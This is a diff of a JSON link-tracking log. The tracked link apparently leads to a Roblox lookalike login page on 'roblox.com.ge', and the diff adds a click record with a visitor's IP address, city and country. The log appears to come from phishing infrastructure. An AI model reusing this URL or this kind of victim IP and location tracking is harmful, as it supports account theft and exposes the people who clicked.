@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1496,
+    "useCount": 1497,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12132,6 +12132,14 @@
       {
         "timestamp": 1777441778909,
         "ip": "103.180.200.52",
+        "country": "Philippines",
+        "city": "Cantilan",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777441789787,
+        "ip": "103.180.201.51",
         "country": "Philippines",
         "city": "Cantilan",
         "flag": "🇵🇭",
